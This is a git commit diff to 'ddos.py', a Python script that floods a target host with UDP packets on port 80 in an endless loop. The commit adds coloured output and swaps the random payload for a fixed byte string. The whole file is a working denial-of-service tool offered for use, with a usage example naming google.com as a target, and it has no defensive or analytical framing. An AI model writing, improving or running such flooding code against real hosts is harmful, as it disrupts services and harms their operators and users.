24504ea180892cc58eb81b5b6af63881887458c5
Ali2004h <ali2004h.linux@gmail.com>
2020-06-11 07:53:14 +0430

    a

--- ddos.py
+++ ddos.py
@@ -1,15 +1,19 @@
 #!/usr/bin/python3
-# Coder By ALi2004h
+# Coder By ALi2004h {*Ali HemmatNia*}
 # Github : github.com/ali2004-linux
 # Version Python All Versions
 
 import socket
 import os
-import sys
+from sys import argv
 from colorama import Fore
+from platform import system
 
-try: os.system ("clear && clear")
-except: os.system ("cls && cls")
+if system() == "Linux":
+    os.system ("clear && clear")
+else: 
+    os.system ("cls && cls")
+
 def banner():
     b = """
         \t    _    _ _ ____   ___   ___  _  _   _     
@@ -19,24 +23,24 @@ def banner():
         \t/_/   \_\_|_|_____|\___/ \___/   |_| |_| |_|                                    
     """
     print(b)
-    print("\n\t\t Github : https://Github.com/Ali2004-linux\n\t\t Gmail : ALi2004h.linux@gmail.com")
-    print("\n\tUsage : python ddos.py http://target.com or Enter Ip Site!")
-    print("\n\tExmple : python ddos.py http://google.com or python3 ddos.py 192.10.133.10")
-    print("\t\t!!==>> Port Default in 80 If Edit Code for Your Port <==!!")
+    print(Fore.BLUE+"\n\t\t Github : https://Github.com/Ali2004-linux\n\t\t Gmail : ALi2004h.linux@gmail.com")
+    print(Fore.RED+"\n\tUsage : python ddos.py http://target.com or Enter Ip Site!")
+    print(Fore.GREEN+"\n\tExmple : python ddos.py http://google.com or python3 ddos.py 192.10.133.10")
+    print(Fore.MAGENTA+"\t\t!!==>> Port Default in 80 If Edit Code for Your Port <==!!"+Fore.WHITE)
+    print(Fore.GREEN+"\t\t\t\tAli2004h {Ali HemmatNia}"+Fore.WHITE)
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #tcp connect
-    c = os.urandom(1000) #create a text 1000 charet
     try:
-        ip = sys.argv[1]
+        ip = argv[1]
         f = 0
+        t = b")P_NNRR$_R2Y_Y$Yryy3#7)&)#&##phe688epd33e43r864r74r4)#)*&rIGIPE"
         try:
             while(True):
-                s.sendto(c, (ip,int(80)))
+                s.sendto(t, (ip,int(80)))
                 f +=  1
-                print(Fore.GREEN+"[*] Sending Packet To %s Count[%d]! "%(ip,f))
+                print(Fore.GREEN+"[***]"+Fore.WHITE+" Sending Packet To %s Count"%ip+Fore.BLUE+"[%d]!"%f+Fore.WHITE)
         except socket.gaierror:
-            print(Fore.RED+"\n \t [*] Plaese Connect To Internet!! or address site not found\n")
-
+            print(Fore.GREEN+"\n \t [*"+Fore.WHITE+"*"+Fore.GREEN+"*]"+Fore.RED+" Plaese Connect To Internet!! or Address Site NotFound\n")
     except IndexError:
         banner()
 
@@ -44,5 +48,7 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        sys.exit()
-        print("BY")
+        print("ByBy")
+        quit()
+        print("ByBy")
+
